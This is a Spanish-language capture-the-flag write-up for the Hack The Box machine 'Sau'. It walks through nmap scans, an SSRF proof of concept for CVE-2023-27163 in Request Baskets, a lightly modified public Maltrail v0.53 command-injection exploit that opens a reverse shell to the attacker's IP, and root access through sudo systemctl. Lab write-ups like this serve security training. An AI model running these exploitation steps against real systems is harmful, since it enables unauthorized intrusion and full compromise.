---
redirect_from:
  - /posts/SAU-WriteUp/

title: "Sau - WriteUp"
date: Wed May 14 2025 21:45:00 GMT+0200 (Central European Summer Time)
categories: [WriteUps, HTB, Linux]
tags: [ctf, nmap, htb, cve, exploit, ldap, python, linux, ssh, bash]
image: https://miro.medium.com/v2/resize:fit:700/0*BJLvRtFaxaRmZJ0-.png
---

{% include machine-info.html
  machine="Sau"
  os="Linux"
  difficulty="Easy"
  platform="HTB"
%}

![Sau](https://miro.medium.com/v2/resize:fit:700/0*BJLvRtFaxaRmZJ0-.png)

-------

NMAP

```bash
# Nmap 7.94SVN scan initiated Thu Nov 23 18:42:02 2023 as: nmap -sCV -p 22,55555 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targetedXML 10.10.11.224
Nmap scan report for 10.10.11.224
Host is up (0.053s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
55555/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Thu, 23 Nov 2023 17:42:37 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Thu, 23 Nov 2023 17:42:09 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Thu, 23 Nov 2023 17:42:09 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94SVN%I=7%D=11/23%Time=655F8EF1%P=x86_64-pc-linux-gnu
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

nmapAll
```bash
nmapAll 10.10.11.224
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-23 18:54 CET
Nmap scan report for 10.10.11.224
Host is up (0.072s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
```

Descubrimos dos puerto filtrados.

Como se ve en los resultados del análisis, tenemos los puertos 80 y 8338, pero ambos están filtrados. Aunque aún podemos intentar acceder al puerto 55555 donde parece estar alojado un sitio web.

![image](https://miro.medium.com/v2/resize:fit:700/0*BJLvRtFaxaRmZJ0-.png)

Podemos explorar un poco la herramienta y descubrir que es un contenedor de solicitudes típico, donde crea nuevas cestas y le otorga un token que puede usar para acceder a la cesta más adelante. Además, podemos enviar solicitudes a nuestra cesta y ver los datos que ingresan, pero no se puede generar ningún ataque en particular a partir de ellos.

Tampoco hay un panel de administración al que podamos intentar acceder. Entonces, lo siguiente que podemos buscar es una vulnerabilidad divulgada públicamente en esta aplicación que podamos explotar.

Con una búsqueda rápida en Google de "exploits de Request Basket", podemos encontrar este [PoC para CVE-2023–27163](https://github.com/entr0pie/CVE-2023-27163) que explota una vulnerabilidad SSRF en Request Basket.

#### Acceso inicial

El exploit es bastante fácil de ejecutar, todo lo que necesitamos es la IP del objetivo y el número de puerto junto con la dirección a la que queremos redirigir nuestra solicitud internamente en el servidor a través de la vulnerabilidad SSRF.

Sabemos que en el puerto 55555 se está ejecutando Request Basket y por el nmap escaneo sabemos que los puertos 80 y 8338 también están abiertos. Entonces, podemos ejecutar el exploit dos veces y crear 2 cestas, una para cada puerto.

```bash
$ ./CVE-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80
...
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "ormkay" proxy basket...
> Basket created!
> Accessing http://10.10.11.224:55555/ormkay now makes the server request to http://127.0.0.1:80.
./CVE-2023-27163.sh: line 43: jq: command not found
> Response body (Authorization): {"token":"d0Im1_4Q-0LM9ZMzQGa0IspRVYa8UFJUbWVn6t4siqcy"}
```

```bash
$ ./CVE-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:8338
...
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "xurrli" proxy basket...
> Basket created!
> Accessing http://10.10.11.224:55555/xurrli now makes the server request to http://127.0.0.1:8338.
./CVE-2023-27163.sh: line 43: jq: command not found
> Response body (Authorization): {"token":"nu6uefehUIMnuT2Ank6Alwp9Kp28u3F4gph61HtJSlAA"}
```

Ahora podemos ir a la cesta recién creada y, con suerte, esa solicitud realizará una solicitud al puerto 80 en el objetivo.

![image](https://miro.medium.com/v2/resize:fit:700/0*J2g4BfjaCB9MEEyb.png)

Parece que alguna otra aplicación llamada _Maltrail_ se está ejecutando en el puerto 80. También sabemos que su versión _v0.53_ se está ejecutando en el servidor.

Podemos hacer lo mismo para el puerto 8338 y encontrar que la misma aplicación se está ejecutando allí también. Ahora que sabemos que se está ejecutando una aplicación específica en la máquina de destino, podemos comenzar a buscar cualquier exploit asociado que pueda ayudarnos a obtener un shell inverso.

Nuevamente, con una búsqueda rápida en Google podemos encontrar un [Exploit for Maltrail v0.53 Unuthenticated OS Command Inject](https://github.com/spookier/Maltrail-v0.53-Exploit) . Si intentamos ejecutar este ataque directamente en la cesta que creamos, "http://127.0.0.1:80" entonces no funcionará porque el ataque apunta al _username_ parámetro de la página de inicio de sesión (mencionada en el archivo README). Entonces, primero debemos encontrar la página de inicio de sesión y luego crear una cesta con el CVE anterior que redirige a la página de inicio de sesión de Maltrail. Nuevamente, buscando en Google, podemos encontrar que la página de inicio de sesión simplemente se llama _login_

```bash
$ ./CVE-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80/login
...
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "cochzx" proxy basket...
> Basket created!
> Accessing http://10.10.11.224:55555/cochzx now makes the server request to http://127.0.0.1:80/login.
./CVE-2023-27163.sh: line 43: jq: command not found
> Response body (Authorization): {"token":"5XjXRC0E4Ebkg3R0gMKSbTem3MYqnkoHTIwFcfvbGFhm"}
```

El siguiente paso es iniciar un listener con _netcat_ y ejecutar el exploit Maltrail en la cesta recién creada.

###### NOTA: 
He modificado el exploit original quitándole de la ruta "/login" dejando la línea 28 de esta manera porque si no el exploit no se ejecutaba en la ruta correcta:

Original
```python
28         target_URL = sys.argv[3] + "/login"
```

Modificado:
```python
28         target_URL = sys.argv[3]
```

Una vez modificado, ejecutamos el exploit con la última cesta creada:

```bash
$ python3 exploit.py 10.10.16.3 1234 http://10.10.11.224:55555/cochzx
...
Running exploit on http://10.10.11.224:55555/cochzx
```

![SAU](/assets/img/htb-writeups/Pasted-image-20231123191947.png)

Somos el usuario _puma_.

Si entramos en el directorio /home del usuario encontraremos nuestra primera flag:

![SAU](/assets/img/htb-writeups/Pasted-image-20231123193028.png)

Probamos si tiene privilegios de ejecución como superusuario en algún binario con _sudo -l_ y tenemos uno:

![SAU](/assets/img/htb-writeups/Pasted-image-20231123192715.png)

Puede ejecutar _systemctl_

Echamos un vistazo a nuestra página de confianza _GTFobins_ y encontramos un exploit:

https://gtfobins.github.io/gtfobins/systemctl/#sudo

Lo ejecutamos como sudo:

```bash
$ sudo /usr/bin/systemctl status trail.service
...
!/bin/sh
```

![SAU](/assets/img/htb-writeups/Pasted-image-20231123193727.png)

Registramos root y pa casa...
---

**Última actualización**: 2025-05-14<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
